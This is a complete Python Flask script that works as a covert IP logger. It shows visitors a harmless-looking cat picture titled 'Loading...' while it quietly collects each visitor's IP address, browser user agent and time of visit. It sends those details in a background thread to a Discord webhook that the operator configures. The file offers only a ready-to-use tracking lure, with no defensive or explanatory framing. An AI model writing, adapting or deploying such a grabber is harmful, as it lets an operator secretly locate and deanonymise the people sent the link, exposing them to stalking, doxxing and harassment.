from flask import Flask, request
import requests
import datetime
import threading

app = Flask(__name__)

# PUT YOUR DISCORD WEBHOOK HERE
WEBHOOK = "YOUR_DISCORD_WEBHOOK_URL"


def send_webhook(message):
    try:
        requests.post(WEBHOOK, json={"content": message}, timeout=3)
    except Exception as e:
        print("Webhook error:", e)


@app.route("/")
def track():

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent")

    time = datetime.datetime.utcnow().strftime("%H:%M:%S")

    message = f"""
🔔 Link Opened!

🌐 IP: {ip}
🧠 Browser: {user_agent}
🕒 Time: {time}
"""

    # Send webhook in background so page loads instantly
    threading.Thread(target=send_webhook, args=(message,)).start()

    return """
    <html>
    <head>
        <title>Loading...</title>
    </head>
    <body style="margin:0;background:black;">
        <img src="https://cataas.com/cat" style="width:100vw;height:100vh;object-fit:cover;">
    </body>
    </html>
    """


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
